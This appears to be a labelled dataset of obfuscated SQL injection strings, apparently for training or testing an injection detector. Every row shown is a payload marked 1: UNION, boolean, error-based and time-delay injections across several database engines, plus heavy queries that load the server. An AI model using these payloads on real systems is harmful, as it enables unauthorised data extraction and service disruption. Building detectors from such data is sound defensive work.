Query,Label
"1""   )    )     )   rlik/**/e   (  selec/**/t   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    a/**/nd    (    (     (  ""text"" lik/**/e ""text",1
"-2364'+  (  sele/**/ct 'qdut' wher/**/e 7560  =  7560 u/**/nion all sele/**/ct 7560,7560,7560,7560,7560--",1
"1'   )    )    an/**/d 6510  =    (  s/**/elect count  (  *  )   fro/**/m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   an/**/d    (    (   'uadr' l/**/ike 'uadr",1
"1%'  )   o/**/r 8315  =    (  sel/**/ect count  (  *  )   fro/**/m sysibm.systa/**/bles as t1,sysibm.systabl/**/es as t2,sysibm.systa/**/bles as t3  )   a/**/nd   (  '%'  =  '",1
-1354   )    )    o/**/r 8571  =  8571--,1
"1'  )   an/**/d elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"-7743"" o/**/r 9323  =  9323#",1
"-9928""   )    )    uni/**/on all sele/**/ct 7511,7511,7511,7511,7511,7511,7511,7511#",1
"1  )   whe/**/re 9213  =  9213 a/**/nd 8189  =    (  sele/**/ct count  (  *  )   f/**/rom sysibm.syst/**/ables as t1,sysibm.systa/**/bles as t2,sysibm.systa/**/bles as t3  )  --",1
1'||  (  selec/**/t 'ghb/**/y' fro/**/m dual whe/**/re 4854  =  4854,1
-4032'  )   wh/**/ere 5157  =  5157 o/**/r 1809  =  2810#,1
"1""   )    )    an/**/d elt  (  4249  =  4249,7259  )   a/**/nd    (    (   ""abcm"" lik/**/e ""abcm",1
1'  )   o/**/r sleep  (  5  )   an/**/d   (  'kgbm'  =  'kgbm,1
"1'||  (  selec/**/t 'eils' wh/**/ere 8308  =  8308 o/**/r 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1 o/**/r char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substri/**/ng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,nu/**/ll  )  -- xsob",1
1  )   w/**/here 2307  =  2307,1
"1""  )   as ifgl whe/**/re 2190  =  2190 rli/**/ke   (  sele/**/ct   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",1
-8999'   )    )     )   o/**/r 6872  =  6872 an/**/d    (    (     (  'jare'  =  'jare,1
"-1254"" o/**/r 4144  =    (  s/**/elect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se/**/lect   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   f/**/rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   fro/**/m dual  )  ",1
"1' i/**/n boolean mode  )   a/**/nd elt  (  9630  =  4765,4765  )  #",1
"1%"" rli/**/ke   (  selec/**/t   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    a/**/nd ""%""  =  """,1
"1'  )   unio/**/n all sel/**/ect n/**/ull,nu/**/ll,nul/**/l--",1
"1' i/**/n boolean mode  )   o/**/r   (  se/**/lect 9173 fro/**/m  (  sele/**/ct count  (  *  )  ,concat  (  0x7171706a71,  (  se/**/lect   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )   x fr/**/om i/**/nfo/**/rmation_schema.character_se/**/ts group b/**/y x  )  a  )  #",1
"-1988 whe/**/re 4597  =  4597 u/**/nion all se/**/lect 4597,4597,4597,4597,4597,4597--",1
"-4923"" o/**/r 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  sele/**/ct   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   an/**/d ""afjc"" lik/**/e ""afjc",1
"1'  )   an/**/d make_s/**/et  (  6488  =  5525,5525  )  ",1
1' i/**/n boolean mode  )   uni/**/on all selec/**/t nu/**/ll#,1
"call regexp_substri/**/ng  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,nul/**/l  )   an/**/d ""rugr""  =  ""rugr",1
1'  )   whe/**/re 8086  =  8086 an/**/d 1430  =  7941--,1
"1""  )   as xaye w/**/here 5343  =  5343 an/**/d 4355  =  7475#",1
"1""  )   o/**/r 8156  =    (  selec/**/t count  (  *  )   f/**/rom generate_series  (  1,5000000   )    )   --",1
"1'||  (  s/**/elect 'bccx' wh/**/ere 5881  =  5881 an/**/d elt  (  1210  =  1210,sleep  (  5   )    )     )  ||'",1
"-8487'  )   wh/**/ere 9655  =  9655 unio/**/n all selec/**/t 9655,9655,9655,9655,9655,9655,9655,9655,9655,9655--",1
-4389'   )    )     )   o/**/r   (  1139  =  3499  )  *3499 an/**/d    (    (     (  'qoch'  =  'qoch,1
"-4033'   )    )    o/**/r 1570  =  convert  (  i/**/nt,  (  se/**/lect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sel/**/ect   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   a/**/nd    (    (   'ouup'  =  'ouup",1
1' wher/**/e 6406  =  6406,1
"1'  )   wher/**/e 5799  =  5799 uni/**/on all s/**/elect nul/**/l,nu/**/ll,nu/**/ll,nu/**/ll,nu/**/ll--",1
"1""   )    )    o/**/r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    a/**/nd    (    (   ""zlwb""  =  ""zlwb",1
"1""   )    )     )   an/**/d 4386  =  utl_i/**/naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sele/**/ct   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   f/**/rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    a/**/nd    (    (     (  ""djrh""  =  ""djrh",1
-2129'  )   o/**/r 2724 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  s/**/elect   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   a/**/nd   (  'eutm' lik/**/e 'eutm,1
"1'   )    )     )   o/**/r 4411  =    (  s/**/elect count  (  *  )   f/**/rom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   a/**/nd    (    (     (  'ogwd' l/**/ike 'ogwd",1
"-2784'   )    )    un/**/ion all sel/**/ect 6775,6775,6775,6775,6775,6775,6775,6775,6775#",1
"-8094  )   o/**/r elt  (  1032  =  1032,3623  )   a/**/nd   (  4569  =  4569",1
"-2909'||  (  selec/**/t 'qfeq' wher/**/e 7062  =  7062 uni/**/on all selec/**/t 7062,7062,7062,7062,7062,7062--",1
-3520%' o/**/r 8571  =  8571--,1
"1"" wh/**/ere 1618  =  1618 o/**/r 8156  =    (  se/**/lect count  (  *  )   fr/**/om generate_series  (  1,5000000   )    )   --",1
1'  )   whe/**/re 7478  =  7478,1
-8080'   )    )    o/**/rder b/**/y 1#,1
"-2798'+  (  selec/**/t 'emui' whe/**/re 9565  =  9565 uni/**/on all sele/**/ct 9565,9565,9565,9565--",1
"-1543%' uni/**/on all sele/**/ct 9341,9341,9341,9341,9341,9341,9341,9341,9341--",1
1  )   o/**/r 6793  =    (  sele/**/ct 6793 fro/**/m pg_sleep  (  5   )    ) ,1
"1'   )    )    a/**/nd   (  s/**/elect 2*  (  if   (    (   selec/**/t * fro/**/m   (  sel/**/ect concat  (  0x7171706a71,  (  sel/**/ect   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   a/**/nd    (    (   'bgdp'  =  'bgdp",1
1'||  (  s/**/elect 'svnn' f/**/rom dual wh/**/ere 8710  =  8710,1
end an/**/d   (  'jzlr'  =  'jzlr,1
"-4558"" o/**/r   (  3965  =  3933  )  *3933 an/**/d ""hmdb"" lik/**/e ""hmdb",1
"1',  (  selec/**/t   (  case when   (  3888  =  3888  )   then   (  selec/**/t count  (  *  )   fro/**/m generate_series  (  1,5000000   )    )    else 1/  (  sel/**/ect 0  )   end   )    )   ",1
1'  )   as dpmh wher/**/e 5281  =  5281 an/**/d 2006  =  2006,1
1'  )   whe/**/re 3767  =  3767 an/**/d 6240  =    (  'qqpjq'||  (  sele/**/ct case 6240 when 6240 then 1 else 0 end fr/**/om rdb$databa/**/se  )  ||'qzvzq'  )  --,1
"1""   )    )    as nbdc w/**/here 4444  =  4444 unio/**/n all sel/**/ect nul/**/l,nul/**/l--",1
"selec/**/t * f/**/rom generate_series  (  2673,2673,case when   (  2673  =  1468  )   then 1 else 0 end  )   lim/**/it 1--",1
"1'  )   a/**/nd 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    an/**/d   (  'seyd'  =  'seyd",1
"1 whe/**/re 1186  =  1186 unio/**/n all sele/**/ct n/**/ull,n/**/ull,nul/**/l,nu/**/ll,nu/**/ll,nul/**/l,nul/**/l#",1
"-1816""  )   o/**/r 1570  =  convert  (  i/**/nt,  (  sel/**/ect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sele/**/ct   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   an/**/d   (  ""dztr"" li/**/ke ""dztr",1
"-5425 w/**/here 5933  =  5933 un/**/ion all se/**/lect 5933,5933,5933--",1
1'+  (  se/**/lect 'jkgf' whe/**/re 7487  =  7487,1
se/**/lect   (  case when   (  1082  =  6755  )   then 1082 else 1082*  (  s/**/elect 1082 f/**/rom mysql.db  )   end  )  #,1
"1%"" uni/**/on all s/**/elect n/**/ull,nu/**/ll,n/**/ull,nul/**/l,nul/**/l,n/**/ull,n/**/ull,nu/**/ll,nu/**/ll,nul/**/l#",1
"-7656""   )    )     )   un/**/ion all selec/**/t 3172,3172,3172,3172,3172,3172,3172,3172,3172,3172--",1
"1"" wher/**/e 1809  =  1809 an/**/d make_s/**/et  (  8403  =  8403,8899  )  --",1
"1   )    )    as qzmg w/**/here 4344  =  4344 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
"-5062""   )    )     )   u/**/nion all s/**/elect 4125,4125--",1
1   )    )    as xroy whe/**/re 3274  =  3274,1
"1'  )   u/**/nion all s/**/elect nul/**/l,nu/**/ll,n/**/ull,n/**/ull,nul/**/l,nul/**/l,nul/**/l,n/**/ull--",1
"1""   )    )     )   an/**/d 6240  =    (  'qqpjq'||  (  s/**/elect case 6240 when 6240 then 1 else 0 end fro/**/m rdb$da/**/tabase  )  ||'qzvzq'  )   a/**/nd    (    (     (  ""buwe""  =  ""buwe",1
"1"" an/**/d   (  sele/**/ct * fr/**/om   (  sel/**/ect  (  sleep  (  5   )    )     )  fzno  )   an/**/d ""ssfu""  =  ""ssfu",1
1%'   )    )     )   rlik/**/e   (  se/**/lect * fr/**/om   (  s/**/elect  (  sleep  (  5   )    )     )  sgvo  )   an/**/d    (    (     (  '%'  =  ',1
"iif  (  5519  =  4796,1,1/0  )  ",1
"1""   )    )    as vhrq wher/**/e 1690  =  1690 a/**/nd elt  (  1210  =  1210,sleep  (  5   )    )   --",1
"call regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n/**/ull  )  ,0  )  ,500000000  )  ,n/**/ull  )  --",1
"1%""   )    )    o/**/r 2367  =    (  s/**/elect count  (  *  )   fr/**/om rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
se/**/lect   (  case when   (  1726  =  4080  )   then 1726 else 1/  (  selec/**/t 0  )   end  )  --,1
"1""  )   wh/**/ere 7548  =  7548",1
1'+  (  s/**/elect sijr wh/**/ere 7250  =  7250,1
"-1162""   )    )    as mhmh wh/**/ere 8710  =  8710 o/**/r make_s/**/et  (  4822  =  7598,7598  )  --",1
"1   )    )     )   unio/**/n all s/**/elect n/**/ull,n/**/ull,nu/**/ll--",1
"1'   )    )    as cbka w/**/here 3176  =  3176 an/**/d 8407  =    (  se/**/lect count  (  *  )   fro/**/m generate_series  (  1,5000000   )    )   --",1
"1""   )    )    a/**/nd 6510  =    (  sele/**/ct count  (  *  )   fr/**/om sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   an/**/d    (    (   ""ksrh""  =  ""ksrh",1
"1""   )    )     )   an/**/d   (  sele/**/ct * fro/**/m   (  selec/**/t  (  sleep  (  5   )    )     )  gcrr  )  #",1
"-8661"" un/**/ion all sele/**/ct 5731,5731--",1
"1'   )    )    a/**/nd make_s/**/et  (  3793  =  8118,8118  )   an/**/d    (    (   'swvc' l/**/ike 'swvc",1
"-3226'||  (  selec/**/t 'ykdw' w/**/here 2617  =  2617 u/**/nion all sel/**/ect 2617,2617--",1
"-5513""   )    )     )   o/**/r 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  s/**/elect   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   a/**/nd    (    (     (  ""ovmk"" l/**/ike ""ovmk",1
waitfo/**/r delay '0:0:5' a/**/nd    (    (   '%'  =  ',1
"1""  )   a/**/nd make_s/**/et  (  8403  =  8403,8899  )   a/**/nd   (  ""dhss""  =  ""dhss",1
-3880  )   o/**/r 4144  =    (  se/**/lect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s/**/elect   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   f/**/rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   fr/**/om dual  )   an/**/d   (  5194  =  5194,1
1'+  (  sele/**/ct 'qxmo' w/**/here 9511  =  9511 rli/**/ke   (  sel/**/ect * fr/**/om   (  selec/**/t  (  sleep  (  5   )    )     )  vwyq  )  #,1
"1'  )   an/**/d exp  (  ~  (  se/**/lect * fr/**/om   (  sel/**/ect concat  (  0x7171706a71,  (  sele/**/ct   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    a/**/nd   (  'cuat'  =  'cuat",1
"  (  s/**/elect * f/**/rom   (  sele/**/ct  (  sleep  (  5   )    )     )  srmq  )   an/**/d ""plqe""  =  ""plqe",1
"1%'   )    )     )   uni/**/on all se/**/lect nul/**/l,n/**/ull,n/**/ull,nul/**/l,nu/**/ll,n/**/ull,n/**/ull,n/**/ull--",1
"1'   )    )     )   o/**/r 5356  =    (  selec/**/t count  (  *  )   fro/**/m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-7963'+  (  sel/**/ect 'kxzh' whe/**/re 7039  =  7039 un/**/ion all selec/**/t 7039,7039,7039,7039,7039,7039--",1
"1"" o/**/r 9643  =    (  sel/**/ect count  (  *  )   fro/**/m domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.ta/**/bles as t3  )  ",1
"-5516'+  (  se/**/lect 'bmlv' w/**/here 7188  =  7188 unio/**/n all sele/**/ct 7188,7188,7188,7188,7188,7188,7188,7188#",1
1 wher/**/e 7055  =  7055,1
"call regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nul/**/l  )  ,0  )  ,500000000  )  ,nul/**/l  )   a/**/nd    (    (     (  ""%""  =  """,1
"-2626%'  )   o/**/r elt  (  7513  =  8586,8586  )   a/**/nd   (  '%'  =  '",1
"1'||  (  sel/**/ect 'iwlj' wher/**/e 8704  =  8704 an/**/d   (  s/**/elect 9067 fr/**/om  (  sele/**/ct count  (  *  )  ,concat  (  0x7171706a71,  (  sele/**/ct   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floo/**/r  (  ran/**/d  (  0  )  *2   )    )   x fro/**/m i/**/nfo/**/rmation_schema.character_s/**/ets group b/**/y x  )  a   )    )   ||'",1
"1'  )   an/**/d extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  s/**/elect   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    a/**/nd   (  'vkde'  =  'vkde",1
"1  )   as zbha wher/**/e 9700  =  9700 o/**/r 6979  =  li/**/ke  (  'abcdefg',upper  (  hex  (  ran/**/domblob  (  500000000/2   )    )      )    )   --",1
"1""  )   wher/**/e 5938  =  5938 a/**/nd   (  se/**/lect * fro/**/m   (  sele/**/ct  (  sleep  (  5   )    )     )  gcrr  )  #",1
1   )    )     )   rl/**/ike   (  se/**/lect * fro/**/m   (  sele/**/ct  (  sleep  (  5   )    )     )  vwyq  )  #,1
"-3868'   )    )    o/**/r make_se/**/t  (  6809  =  1236,1236  )   an/**/d    (    (   'evnj'  =  'evnj",1
"-2365   )    )    unio/**/n all s/**/elect 8190,8190#",1
-2039'  )   o/**/r 2724 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sel/**/ect   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1
"1'+  (  sel/**/ect pwvr w/**/here 3028  =  3028 o/**/r 6979  =  lik/**/e  (  'abcdefg',upper  (  hex  (  ran/**/domblob  (  500000000/2   )    )      )    )   --",1
1'  )   w/**/here 6440  =  6440 o/**/r   (  sele/**/ct * f/**/rom   (  s/**/elect  (  sleep  (  5   )    )     )  sddo  )  #,1
"1""   )    )    a/**/nd 2716  =    (  sel/**/ect count  (  *  )   f/**/rom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1"" wh/**/ere 1115  =  1115 o/**/r 8384  =  li/**/ke  (  'abcdefg',upper  (  hex  (  ran/**/domblob  (  500000000/2   )    )      )    )   --",1
"1%"" o/**/r   (  selec/**/t 2*  (  if   (    (   selec/**/t * f/**/rom   (  sel/**/ect concat  (  0x7171706a71,  (  se/**/lect   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   a/**/nd ""%""  =  """,1
"-3436  )   o/**/r elt  (  1032  =  1032,3623  )  ",1
"1' o/**/r 9643  =    (  s/**/elect count  (  *  )   f/**/rom domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.tabl/**/es as t3  )  ",1
"1%'  )   unio/**/n all sel/**/ect nu/**/ll,nu/**/ll,n/**/ull,n/**/ull,nul/**/l--",1
"1%'   )    )     )   a/**/nd 3202  =  li/**/ke  (  'abcdefg',upper  (  hex  (  ra/**/ndomblob  (  500000000/2   )    )      )    )    an/**/d    (    (     (  '%'  =  '",1
"1""   )    )    o/**/r   (  sel/**/ect 2*  (  if   (    (   se/**/lect * fr/**/om   (  sele/**/ct concat  (  0x7171706a71,  (  sele/**/ct   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   an/**/d    (    (   ""qgle"" lik/**/e ""qgle",1
1'||  (  sele/**/ct 'lxyu' fro/**/m dual w/**/here 5789  =  5789 un/**/ion all selec/**/t nu/**/ll#,1
" selec/**/t sleep  (  5  )   a/**/nd    (    (     (  ""zlal""  =  ""zlal",1
"1%""   )    )     )   u/**/nion all s/**/elect n/**/ull,nul/**/l,nul/**/l,n/**/ull,n/**/ull,n/**/ull,nu/**/ll,nu/**/ll,nu/**/ll#",1
"1',  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  s/**/elect   (  case when   (  7823  =  7823  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",1
"se/**/lect count  (  *  )   fro/**/m generate_series  (  1,5000000  )   a/**/nd    (    (   ""%""  =  """,1
"1'||  (  sel/**/ect 'drna' f/**/rom dual w/**/here 5082  =  5082 a/**/nd 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  ||'",1
"1%"" a/**/nd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sele/**/ct   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   an/**/d ""%""  =  """,1
"1 u/**/nion all selec/**/t nu/**/ll,nul/**/l,n/**/ull,n/**/ull#",1
"1%""  )   u/**/nion all se/**/lect nul/**/l,nul/**/l,nul/**/l,n/**/ull,n/**/ull,n/**/ull,nul/**/l,nul/**/l#",1
"-9356 o/**/r elt  (  1032  =  1032,3623  )  -- izgi",1
1   )    )    o/**/r/**/der b/**/y 1#,1
"1'   )    )     )   un/**/ion all sele/**/ct nu/**/ll,nul/**/l,nu/**/ll,nu/**/ll,nul/**/l,n/**/ull,nu/**/ll,n/**/ull--",1
"1""   )    )    as yosd w/**/here 1255  =  1255",1
"1%""   )    )    o/**/r char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substri/**/ng  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,nul/**/l  )  --",1
"1""  )   as kslq w/**/here 8669  =  8669 a/**/nd 8635  =    (  sel/**/ect count  (  *  )   fr/**/om generate_series  (  1,5000000   )    )   --",1
"1"" uni/**/on all se/**/lect nu/**/ll,nul/**/l,nu/**/ll,n/**/ull,n/**/ull,nu/**/ll,n/**/ull#",1
"1'   )    )     )   an/**/d elt  (  3114  =  3114,sleep  (  5   )    )   #",1
1  )   an/**/d 7533  =  7533 a/**/nd   (  7175  =  7175,1
"1""   )    )    an/**/d 7533  =  7533 a/**/nd    (    (   ""gkca""  =  ""gkca",1
"-4711%""   )    )    uni/**/on all se/**/lect 6737,6737,6737,6737#",1
-7675%'   )    )     )   o/**/rd/**/er b/**/y 1--,1
1'+  (  selec/**/t goec w/**/here 9460  =  9460 rli/**/ke   (  se/**/lect   (  case when   (  4740  =  1203  )   then 1 else 0x28 end   )    )     )  +',1
1'  )   wh/**/ere 3730  =  3730 an/**/d sleep  (  5  )  #,1
"1'+  (  se/**/lect iaeu wh/**/ere 5509  =  5509 o/**/r 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1'||  (  sele/**/ct 'bmyt' fr/**/om dual wher/**/e 9407  =  9407 o/**/r 8384  =  lik/**/e  (  'abcdefg',upper  (  hex  (  ra/**/ndomblob  (  500000000/2   )    )      )    )     )  ||'",1
"1  )   w/**/here 8671  =  8671 an/**/d make_se/**/t  (  4931  =  1642,1642  )  --",1
-3596   )    )     )   o/**/r 5903  =    (  'qqpjq'||  (  s/**/elect case 5903 when 5903 then 1 else 0 end fr/**/om rdb$data/**/base  )  ||'qzvzq'  )   an/**/d    (    (     (  3645  =  3645,1
-2431'  )   o/**/r 8571  =  8571--,1
"-8599   )    )    o/**/r elt  (  5628  =  2324,2324  )   an/**/d    (    (   1134  =  1134",1
"1 o/**/r char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substri/**/ng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,nul/**/l  )  ",1
"sele/**/ct count  (  *  )   fr/**/om rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 an/**/d    (    (   'rkoe'  =  'rkoe",1
"1'  )   as jxqt wh/**/ere 4322  =  4322 o/**/r char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nul/**/l  )  ,0  )  ,500000000  )  ,n/**/ull  )  --",1
"-8919"" o/**/r 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selec/**/t   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   a/**/nd ""nstr""  =  ""nstr",1
"-9136%""  )   u/**/nion all selec/**/t 3081,3081,3081,3081,3081,3081,3081#",1
"1"" whe/**/re 6325  =  6325 u/**/nion all s/**/elect nul/**/l,nul/**/l,n/**/ull,n/**/ull,nul/**/l,nu/**/ll,nu/**/ll,nu/**/ll,n/**/ull,n/**/ull#",1
"1%""   )    )    u/**/nion all sel/**/ect nul/**/l,nu/**/ll,n/**/ull,nul/**/l,n/**/ull,nu/**/ll,nu/**/ll#",1
"1%"" a/**/nd 2006  =  2006",1
"-2852%'  )   o/**/r 1 group b/**/y concat  (  0x7171706a71,  (  sele/**/ct   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floo/**/r  (  ran/**/d  (  0  )  *2   )    )    havi/**/ng mi/**/n  (  0  )  #",1
"1%'   )    )     )   o/**/r 5356  =    (  sel/**/ect count  (  *  )   f/**/rom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
-5327'   )    )     )   o/**/r 1606  =  6099,1
"-2518' u/**/nion all selec/**/t 6818,6818,6818,6818,6818,6818#",1
"-8654' unio/**/n all s/**/elect 7190,7190,7190,7190,7190#",1
"1'  )   o/**/r 4411  =    (  sel/**/ect count  (  *  )   fro/**/m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   an/**/d   (  'wgbh'  =  'wgbh",1
-7444   )    )     )   o/**/r 1342  =  9774,1
"1'   )    )    unio/**/n all selec/**/t nul/**/l,n/**/ull,n/**/ull#",1
"1'  )   as mmhe whe/**/re 2142  =  2142 o/**/r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
